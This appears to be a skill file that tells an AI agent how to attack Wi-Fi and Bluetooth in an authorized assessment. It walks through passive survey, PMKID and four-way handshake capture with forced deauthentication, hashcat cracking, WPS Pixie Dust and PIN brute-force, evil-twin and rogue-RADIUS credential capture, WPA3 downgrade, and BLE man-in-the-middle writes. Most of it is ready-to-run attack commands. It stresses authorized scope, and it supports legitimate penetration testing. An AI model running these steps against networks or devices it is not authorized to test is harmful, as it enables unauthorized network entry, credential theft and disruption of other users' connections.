---
name: wireless-technique
description: "Auth assessment: wireless methodology; Wi-Fi/BLE survey, WPA/WPA3 handshake/PMKID labs, WPS, rogue-AP simulation, auth-material handoff."
license: MIT
compatibility: "Linux; compatible wireless adapter for monitor-mode lab work."
metadata:
  author: AeonDave
  version: "1.0"
  category: offensive-techniques
  language: multi
---

# Wireless Technique

Goal: identify, capture, and exploit wireless network credentials or gain direct network access via RF attack surface with minimal RF noise and targeted scope.

## When this technique applies

- Physical proximity to target wireless infrastructure (within RF range).
- Authorized wireless assessment of 802.11 or Bluetooth/BLE networks.
- Initial access objective requiring network entry via Wi-Fi.
- Authorized analysis of wireless packet captures containing WPA handshakes, PMKID material, or RF evidence.

## Boundary with other skills

- **Handshake / PMKID cracking**: captured material → `cracking-technique` (hashcat mode 2500/22000/16800).
- **Post-network-access**: use `recon-technique` + `vuln-search-technique` once on network.
- **PCAP analysis**: traffic captured during or after attack → `forensic-technique` §3 (PCAP/network forensics) or `network-technique` §Case B.
- **BLE protocol RE**: deep protocol analysis → `reversing-technique` §6 (protocol reversing).

## Initial triage

Before transmitting, classify the wireless target set and choose the quietest path that can satisfy the assessment objective.

- **Starting state**: are you assessing Wi-Fi access control, handshake capture, WPS exposure, evil-twin resilience, BLE exposure, or analyzing an existing capture?
- **First questions**: what RF scope is authorized, what SSIDs/BSSIDs and encryption modes are present, are clients active, and is the likely first path passive capture, PMKID, targeted handshake, WPS, or BLE enumeration?
- **Immediate actions**: complete passive survey, rank targets by value and feasibility, then choose one attack lane per target.
- **Tool-family direction**: use passive survey skills first (`kismet`, `aircrack-ng` capture flow, `lswifi`, `bluez`, `sparrow-wifi`), then move to active capture or impersonation tooling (`aircrack-ng`, `wifite`, `bettercap`) only when the classification justifies it.
- **Escalation rule**: prefer passive and targeted capture over noisy broadcast actions; only deauth or impersonate when passive routes are insufficient.

## Hardware requirements

- 802.11 adapter capable of **monitor mode** and **packet injection** (iwconfig / airmon-ng compatible).
- Separate adapter for BLE enumeration (`hci` device or dongle).
- Verify: `iw list | grep -A10 "Supported interface modes"` — must show `monitor`.

## Agent operating model

```
Loop:
  1. Passive survey — inventory APs and clients without transmitting.
  2. Target selection — identify high-value networks by SSID, client count, encryption.
  3. Attack path selection — based on encryption type and WPS status.
  4. Capture or exploit.
  5. Crack offline or pivot to network.

Stop when: valid PSK recovered, network access achieved, or scope exhausted.
```

Never transmit before completing passive survey. Always operate within authorized scope and RF boundaries.

---

## Phase 1 — Passive survey

Zero transmission. Capture all beacon frames and probe requests in range.

### Adapter setup

```bash
# Check adapter and capabilities
iw dev; iw list | grep -A5 "Supported interface modes"

# Enable monitor mode
sudo airmon-ng start wlan0        # creates wlan0mon
# or manually:
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

# Kill interfering processes first
sudo airmon-ng check kill
```

### Survey with airodump-ng

```bash
# Broad scan — all channels, all bands
sudo airodump-ng wlan0mon

# Dual-band scan (2.4 + 5 GHz)
sudo airodump-ng --band abg wlan0mon

# Save survey to file for analysis
sudo airodump-ng wlan0mon -w survey --output-format csv,cap

# Focused on specific channel after target identified
sudo airodump-ng -c <channel> --bssid <AP_MAC> wlan0mon -w capture
```

### Kismet — comprehensive passive survey

Better for long-term logging, multiple adapters, and BLE/802.15.4.

```bash
sudo kismet -c wlan0mon
# Web UI: http://localhost:2501 (default: admin/kismet or set at first run)

# CLI summary
kismetdb_to_wireshark --in kismet_log.kismet --out kismet.pcap
kismetdb_to_csv --in kismet_log.kismet --out devices.csv
```

See `offensive-tools/wireless/kismet/`.

### lswifi — quick Windows survey

```powershell
lswifi         # list all visible networks with signal, encryption, channel
lswifi -ap     # AP-only view
```

See `offensive-tools/wireless/lswifi/`.

### Survey output to collect

Per AP:
- BSSID, SSID, channel, band (2.4/5/6 GHz), encryption type (OPN/WEP/WPA2-PSK/WPA2-EAP/WPA3)
- Client MACs, probe requests (reveal hidden SSIDs)
- Signal strength (RSSI) — gauge physical proximity
- WPS enabled/locked status

---

## Phase 2 — Target classification and attack path selection

| Encryption | WPS | Primary attack | Secondary |
|------------|-----|----------------|-----------|
| OPN (open) | N/A | Direct join | Traffic capture → forensic-technique |
| WEP | N/A | ARP replay → key recovery | Statistical IV attack |
| WPA2-PSK | enabled + unlocked | WPS PIN / Pixie Dust | PMKID + handshake |
| WPA2-PSK | disabled/locked | PMKID → handshake capture | Evil twin |
| WPA2-EAP (Enterprise) | N/A | Evil twin EAP downgrade → RADIUS | Client cert theft |
| WPA3-SAE | N/A | Downgrade to WPA2 (if transition mode) | Dictionary via PMKID/dragonblood |

Decision rules:

- Prefer PMKID before deauth when the AP exposes it; no client needed and lower RF noise.
- Prefer targeted four-way handshake capture when clients are active and PMKID is unavailable.
- Use WPS/Pixie Dust only when WPS is enabled and not locked; stop immediately on lock indicators.
- Treat WPA2/WPA3 Enterprise as identity/certificate/RADIUS assessment, not PSK cracking.
- For BLE, switch to `references/bluetooth-attacks.md`; BLE pairing/GATT flaws are separate from Wi-Fi credential capture.

---

## Phase 3 — WPA2-PSK attacks

### PMKID capture (no client needed)

Faster than handshake — requests PMKID directly from AP without waiting for client association.

```bash
# hcxdumptool — capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3

# Filter for specific BSSID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=bssid.txt --filtermode=2

# Convert for hashcat (mode 22000)
hcxpcapngtool -o hash22000.txt pmkid.pcapng

# Crack (see cracking-technique)
hashcat -m 22000 hash22000.txt /path/to/rockyou.txt
```

### Four-way handshake capture

Requires client to authenticate. Either wait or force deauth.

```bash
# Start targeted capture
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w handshake wlan0mon

# In another terminal — deauth to force reauthentication
sudo aireplay-ng -0 3 -a <AP_MAC> -c <client_MAC> wlan0mon    # targeted (quieter)
sudo aireplay-ng -0 5 -a <AP_MAC> wlan0mon                     # broadcast (noisier)

# Verify handshake captured
aircrack-ng handshake*.cap   # shows "WPA (1 handshake)"

# Convert for hashcat (mode 2500 legacy or 22000)
hcxpcapngtool -o hash.txt handshake.cap
hashcat -m 22000 hash.txt rockyou.txt
```

### wifite — automated multi-target

Automates passive → deauth → handshake → PMKID for multiple targets.

```bash
# Scan, attack all WPA targets, save results
sudo wifite --kill

# Target specific SSID
sudo wifite --ssid "TargetNetwork" --kill

# WPS attacks only
sudo wifite --wps --kill

# Output directory with captured hashes
sudo wifite --dict /path/to/rockyou.txt --kill   # auto-crack inline
```

See `offensive-tools/wireless/wifite/`.

→ Full attack patterns and hashcat cracking handoff: `references/wpa-attacks.md`.

---

## Phase 4 — WPS attacks

WPS PIN has a design flaw: PIN validated in two halves → only 11,000 combinations (not 100,000,000).

Decision flow:

1. Check WPS presence and lock state with `wash`.
2. If WPS disabled or locked → skip WPS; move to PMKID/handshake/evil twin.
3. If WPS enabled and unlocked → try Pixie Dust first (`reaver -K 1`) because vulnerable chipsets can reveal the PIN offline from one exchange.
4. If Pixie Dust fails → online PIN brute-force only when explicitly allowed, rate-limited, and lock behavior is understood.
5. If lock appears → stop; repeated attempts are noisy and can trigger WIDS or disable WPS.

```bash
# WPS status check
sudo wash -i wlan0mon           # list APs with WPS enabled and lock status

# Pixie Dust attack (offline PIN recovery from WPS exchange — fast when vulnerable)
sudo reaver -i wlan0mon -b <AP_MAC> -K 1 -v    # -K 1 = Pixie Dust mode

# Online brute-force (slow — only when Pixie Dust fails and AP not locked)
sudo reaver -i wlan0mon -b <AP_MAC> -v -d 1 --lock-delay=300

# bully — alternative WPS attacker
sudo bully wlan0mon -b <AP_MAC> -d -v 3
```

WPS lock detection: if AP locks after several attempts, stop immediately — lock triggers IDS alerts and some APs disable WPS permanently.

---

## Phase 5 — Evil twin / captive portal

Impersonate legitimate AP to capture credentials or EAP material.

### WPA2-Personal evil twin (PSK capture)

```bash
# hostapd-wpe setup (captures WPA2-EAP credentials)
# Edit hostapd-wpe.conf: ssid, interface, channel, driver

# airbase-ng simple open evil twin + DHCP
sudo airbase-ng -a <AP_MAC_spoof> -e "TargetSSID" -c <channel> wlan0mon
# Then: dhcpd on at0 interface, redirect traffic

# Advanced: use bettercap for captive portal with credential page
sudo bettercap -eval "set wifi.interface wlan0mon; wifi.recon on"
```

### WPA2-Enterprise evil twin (EAP downgrade)

Force clients to connect to rogue RADIUS → capture MSCHAPv2 hashes → crack offline.

```bash
# hostapd-wpe — enterprise evil twin with credential logging
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured hashes in /tmp/hostapd-wpe.log — crack with hashcat -m 5500 (NetNTLMv1) or -m 5600 (NetNTLMv2)

# eaphammer — full enterprise attack suite
python3 eaphammer -i wlan0mon --channel <ch> --auth wpa-eap --essid "Corp-WiFi" \
  --creds --hostile-portal
```

→ Full evil twin patterns, captive portal, EAP downgrade: `references/evil-twin.md`.

---

## Phase 6 — WPA3 and transition mode

WPA3-SAE provides forward secrecy and stronger offline attack resistance. However:

- **Transition mode** (WPA2/WPA3 mixed): AP accepts both SAE and PSK → attack via WPA2 path.
- **Dragonblood**: timing/cache side-channel against SAE handshake (patched in most 2020+ firmware).

```bash
# Check if transition mode active
sudo airodump-ng wlan0mon | grep -i "WPA3\|SAE"
# If "WPA2 WPA3" both listed → transition mode → use WPA2 attack path

# Verify client behavior: probe client connects via WPA2 in transition mode
# Capture regular 4-way handshake and attack normally
```

→ WPA3 dragonblood details and BLE attacks: `references/wpa3-and-ble.md`.

---

## Phase 7 — Bluetooth / BLE enumeration

Passive BLE device survey — identify exposed GATT services, advertised data, signal proximity.

```bash
# bluetoothctl — interactive BLE scan
sudo bluetoothctl
[bluetooth]# scan on      # passive scan
[bluetooth]# devices      # list discovered
[bluetooth]# info <MAC>   # device details

# hcitool — raw HCI commands
sudo hcitool lescan         # BLE scan
sudo hcitool scan           # classic Bluetooth scan

# Gatttool — GATT service enumeration
gatttool -b <device_MAC> -I
[device_MAC][LE]> connect
[device_MAC][LE]> primary          # list services
[device_MAC][LE]> characteristics  # list characteristics

# btlejuice / bettercap for BLE MITM
sudo bettercap -eval "ble.recon on"
bettercap> ble.show                     # show discovered devices
bettercap> ble.enum <MAC>               # enumerate all handles
bettercap> ble.write <MAC> <handle> <hex_data>   # write to characteristic
```

See `offensive-tools/wireless/bluez/`, `offensive-tools/wireless/sparrow-wifi/`, `offensive-tools/wireless/kismet/`, and `offensive-tools/network/bettercap/`.

→ BLE GATT exploitation, pairing/security-mode testing, classic Bluetooth attacks, BLE MITM: `references/bluetooth-attacks.md`.

---

## Quality gates

- Monitor mode confirmed before any capture (check with `iw dev`).
- Passive survey complete — target BSSID, channel, encryption, WPS status all known.
- Deauth attacks targeted (specific client MAC) not broadcast unless necessary.
- Handshake/PMKID capture verified before handing off to cracking.
- WPS attacks stopped at first lock indicator.
- Evil twin deployed only within authorized RF perimeter.
- BLE writes/MITM attempted only after passive discovery and scoped device identity are confirmed.

## Anti-patterns

- Transmitting (deauth, injection) before completing passive survey → unnecessary noise.
- Broadcasting deauth at max power → triggers WIDS on adjacent APs.
- Attempting WPS brute-force when AP shows WPS locked → locked status means IDS is active.
- Cracking inline during capture instead of offline → slows capture, may miss handshake.
- Using wrong channel/BSSID combination → capturing wrong AP traffic.

## Resources

- [references/wpa-attacks.md](references/wpa-attacks.md) — WPA2 attack playbooks: PMKID, 4-way handshake, deauth strategy, hashcat format conversion, cracking handoff.
- [references/wpa3-and-ble.md](references/wpa3-and-ble.md) — WPA3 transition mode exploitation, dragonblood, BLE enumeration, GATT service analysis, BLE MITM patterns.
- [references/bluetooth-attacks.md](references/bluetooth-attacks.md) — Bluetooth/BLE assessment sequence: discovery, pairing, authentication, encryption, GATT/SDP, MITM/downgrade, evidence packaging.
- [references/evil-twin.md](references/evil-twin.md) — Evil twin setup, WPA2-Personal PSK capture, WPA2-Enterprise EAP downgrade (hostapd-wpe, eaphammer), captive portal credential harvest.
- [references/iot-zigbee-matter.md](references/iot-zigbee-matter.md) — Load for 802.15.4 mesh protocols. Covers KillerBee, Touchlink commissioning abuse, and Zigbee Global Link Key sniffing.
- [references/sub-ghz-lorawan.md](references/sub-ghz-lorawan.md) — Load for 433/868/915 MHz targets. Covers raw IQ capture/replay, OOK/FSK analysis, and LoRaWAN ABP/OTAA key vulnerabilities.
